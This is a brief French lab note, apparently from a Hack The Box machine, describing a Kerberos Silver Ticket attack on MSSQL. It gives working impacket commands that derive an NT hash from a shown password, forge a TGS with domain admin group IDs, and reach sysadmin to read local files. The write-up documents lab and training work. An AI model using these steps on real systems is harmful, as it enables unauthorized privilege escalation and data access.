# Kerberos & Silver Ticket Attack

***

## <mark style="color:red;">**Kerberos & Silver Ticket Attack**</mark>

**Objectif :** Escalader les privilèges en forgeant un ticket Kerberos (TGS) pour un service MSSQL.

**Étapes :**

1. Calculer NT hash du compte cible (`mssqlsvc`)

```bash
printf 'purPLE9795!@' | iconv -f utf-8 -t utf-16le | openssl dgst -md4 -binary | xxd -p
```

2. Créer le Silver Ticket :

```bash
impacket-ticketer -nthash <NT-HASH> \
  -domain-sid "S-1-5-21-..." \
  -domain "SIGNED.HTB" \
  -spn "mssqlsvc/dc01.signed.htb" \
  -groups 1105,512,519,544,526,1108 \
  -user-id 1103 \
  mssqlsvc
```

3. Export du ticket pour utilisation dans l’authentification :

```bash
export KRB5CCNAME=mssqlsvc.ccache
```

4. Connexion MSSQL en Kerberos (`-k` → keytab/ticket)

```bash
impacket-mssqlclient signed.htb/mssqlsvc@dc01.signed.htb -no-pass -k -port 1433
```

**Résultat :**

* Accès sysadmin MSSQL
* Lecture de fichiers locaux via `OPENROWSET(BULK ...)`

**Concept clé :**

* Silver Ticket = ticket Kerberos forgé pour un service spécifique
* Permet de se faire passer pour un compte avec certains droits
* Limité au service ciblé (ici MSSQL)

***
